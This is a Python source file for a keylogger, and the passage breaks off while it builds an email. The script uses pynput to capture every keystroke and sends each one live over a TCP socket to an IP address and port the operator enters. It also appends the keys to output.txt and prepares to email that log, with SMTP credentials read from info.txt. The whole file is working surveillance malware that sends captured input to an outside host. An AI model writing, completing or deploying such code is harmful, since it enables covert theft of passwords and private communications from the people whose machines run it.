import pynput.keyboard
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
import getpass

# Check if the info.txt file exists
if os.path.exists("info.txt"):
    # Open the info.txt file to read the email address and password
    with open("info.txt", "r") as f:
        email_address = f.readline().strip()
        email_password = f.readline().strip()
else:
    # Prompt the user for the email address and password
    email_address = input("Enter the email address to send the output.txt: ")
    email_password = getpass.getpass(prompt='Enter the password for the email address: ')
    # Save the email address and password to the info.txt file
    with open("info.txt", "w") as f:
        f.write(email_address + "\n")
        f.write(email_password)
    # make the info.txt file only readable by the owner
    os.chmod("info.txt", 0o600)

# Prompt the user for the IP address and port number
ip_address = input("Enter the IP address to send the keylogs to: ")
port_num = input("Enter the port number to use: ")

# Create a socket connection to send the keylogs
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ip_address, int(port_num)))

# Open output.txt in "a" (append) mode to write the keylogs to
f = open("output.txt", "a")

# Function to be called on key press
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    client_socket.send(current_key.encode())
    f.write(current_key)

# Create a keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    keyboard_listener.join()

f.close()

# send the output.txt to an email address
from_address = email_address
to_address = email_address

msg = MIMEMultipart()
msg['From'] = from_address
msg['To'] = to_address
msg['Subject'] = "KeyLogger output.txt"

part = MIMEBase('application', "octet-stream")
part.set_payload(open("output.txt", "rb").read())
encoders.encode_base
